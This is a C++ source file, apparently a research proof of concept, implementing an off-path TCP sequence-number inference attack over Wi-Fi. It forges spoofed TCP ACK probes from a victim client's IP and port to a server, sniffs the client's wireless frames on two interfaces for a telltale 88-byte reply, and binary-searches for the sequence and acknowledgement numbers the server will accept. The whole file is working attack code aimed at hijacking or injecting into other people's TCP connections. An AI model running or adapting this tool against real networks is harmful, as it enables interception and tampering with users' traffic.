#include "AckFinder.h"
#include <iostream>
#include <fstream>
#include <tins/tins.h>
#include <vector>
#include <deque>
#include <chrono> 
#include <random>
#include <thread>
#include <algorithm>

using namespace Tins;

void AckFinder::capturePackets_1(std::vector<Packet>& pkts_1) {
    SnifferConfiguration config;
    config.set_filter("wlan addr2 " + client_mac);
    config.set_immediate_mode(true);
    Sniffer sniffer(sniff_if_name[0], config);

    auto s_time = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::milliseconds(50);
    while (std::chrono::high_resolution_clock::now()-s_time < duration) {
        Packet packet=sniffer.next_packet();
        pkts_1.push_back(packet);
    }
}

void AckFinder::capturePackets_2(std::vector<Packet>& pkts_2) {
    SnifferConfiguration config;
    config.set_filter("wlan addr2 " + client_mac);
    config.set_immediate_mode(true);
    Sniffer sniffer(sniff_if_name[1], config);

    auto s_time = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::milliseconds(50);
    while (std::chrono::high_resolution_clock::now()-s_time < duration) {
        Packet packet=sniffer.next_packet();
        pkts_2.push_back(packet);
    }
}

void AckFinder::handle_packets(const std::vector<Packet> pkts){
    target_frame_num = 0;
    
    for(const auto& packet : pkts){
        
        if(packet.pdu()->find_pdu<Dot11QoSData>()){
            if(packet.pdu()->find_pdu<RawPDU>()){
                if (packet.pdu()->rfind_pdu<RawPDU>().size() == 88){
                    target_frame_num += 1;
                    return;
                }
            }
        }
    }
}

void AckFinder::checkSeqList(const std::vector<uint32_t>& seq_list) {

    if (seq_list.empty()) {
        target_frame_num = 0;
        std::cout << "[*] Warning: the seq_list is empty" << std::endl;
        return;
    }

    std::vector<IP> send_list;
    for (uint32_t sq : seq_list) {
        IP packet = IP(client_ip, server_ip) / TCP(client_port, server_port) / RawPDU("AAAA");
        TCP &tcp = packet.rfind_pdu<TCP>();
        tcp.set_flag(TCP::ACK, true);
        tcp.seq(sq);
        for (int i = 0; i < repeat_num; i++) {
            send_list.emplace_back(packet);
        }
    }

    send_num += send_list.size();
    for (const IP& pkt : send_list) {
        send_byte += pkt.size();
    }

    //First sniff Wi-Fi card
    std::vector<Packet> pkts_1;
    AckFinder sniff_object_1;
    std::thread sniffer_thread_1(&AckFinder::capturePackets_1, &sniff_object_1, std::ref(pkts_1));

    //Second sniff Wi-Fi card
    std::vector<Packet> pkts_2;
    AckFinder sniff_object_2;
    std::thread sniffer_thread_2(&AckFinder::capturePackets_2, &sniff_object_2, std::ref(pkts_2));
   
    PacketSender sender;
    for(auto pkt : send_list){
        sender.send(pkt, send_if_name);
    }

    std::this_thread::sleep_for(std::chrono::milliseconds(50));

    /* Avoid long sniffing time due to loss of probe packets/responses */
    std::string add_ip = "8.8.8.8";
    IP add_packet = IP(client_ip, add_ip) / ICMP();
    ICMP &icmp = add_packet.rfind_pdu<ICMP>();
    icmp.type(ICMP::ECHO_REQUEST);

    for (int i =0; i<2; i++) {
        sender.send(add_packet, send_if_name);
    }

    sniffer_thread_1.join();
    sniffer_thread_2.join();

    /* Merge sniffed Wi-Fi frames */
    pkts_1.insert(pkts_1.end(), pkts_2.begin(), pkts_2.end());

    handle_packets(pkts_1);
}

void AckFinder::seqCheck(uint32_t sq, SeqNextLocation& location) {
    uint32_t seq_next_left = 0;
    int check_line = 1;
    int check_sum = 2;

    for (int i = 0; i < check_sum; i++) {
        checkSeqList({sq});
        if (target_frame_num > 0) {
            seq_next_left++;
            if (seq_next_left >= check_line) {
                location = SEQ_NEXT_L;
                return;
            }      
        }
        else if ((seq_next_left+check_sum-i) < check_line) {
            location = SEQ_NEXT_R;
            return;
        }
}
    location = SEQ_NEXT_R;
}

void AckFinder::findSentSeq() {
    sent_seq = 0;
    SeqNextLocation location;
    seqCheck(static_cast<uint32_t>(sent_seq), location);

    if (location == SEQ_NEXT_R) {
        sent_seq -= maxUint32Value_half;
        if (sent_seq < 0) {
            sent_seq += (maxUint32Value);
        }
    }

    std::cout << "[+] Find a sent seq: " << sent_seq << std::endl;
}

void AckFinder::findSeqExact() {
    std::cout << "++++++++++ Try to find the client side seq num: ++++++++++" << std::endl;
    findSentSeq();
    int64_t rb = sent_seq;
    int64_t lb = rb - maxUint32Value_half;
    int64_t ans = -1;

    while (rb >= lb) {
        int64_t mid = (rb + lb) / 2;
        uint32_t seq_mid;
        if (mid < 0) {
            seq_mid = static_cast<uint32_t>(mid + maxUint32Value);
        }
        else{
            seq_mid = static_cast<uint32_t>(mid);
        }

        SeqNextLocation check;
        seqCheck(seq_mid, check);

        if (check == SEQ_NEXT_L) {
            ans = mid;
            rb = mid - 1;
        }
        else {
            lb = mid + 1;
        }
    }

    sent_seq_left_bound = ans >= 0 ? ans : ans + maxUint32Value;
    result = static_cast<uint32_t>(sent_seq_left_bound + maxUint32Value_half);

    std::cout << "[+] Find the sent seq left bound: " << sent_seq_left_bound << ", the seq next: " << result << std::endl;
}

void AckFinder::write_data(){
    std::ofstream file("ack_data.txt", std::ios::app);

    if (!file.is_open()){
        std::cerr << "Cannot open file!" << std::endl;
        return ;
    }

    file << cost_time << " " << send_rate << " " << send_byte << " " << send_num << std::endl;
    file.close();

    return ;
}

void AckFinder::run() {
    auto time_start = std::chrono::system_clock::now();
    send_num = 0;
    send_byte = 0;
    sent_seq_left_bound = -1;
    result = 0;
    findSeqExact();

    auto time_end = std::chrono::system_clock::now();
    cost_time = std::chrono::duration<double>(time_end - time_start).count();
    send_rate = static_cast<double>(send_byte) / cost_time;

    std::cout << "Find the clinet side seq next, server side accepted acknowledgement num: " << result << std::endl;
    std::cout << "Send Packets: " << send_num << std::endl;
    std::cout << "Send Bytes: " << send_byte << " (Bytes)" << std::endl;
    std::cout << "Cost Time: " << cost_time << " (s)" << std::endl;
    std::cout << "Send Rate: " << send_rate << " (Byte/s)" << std::endl;
}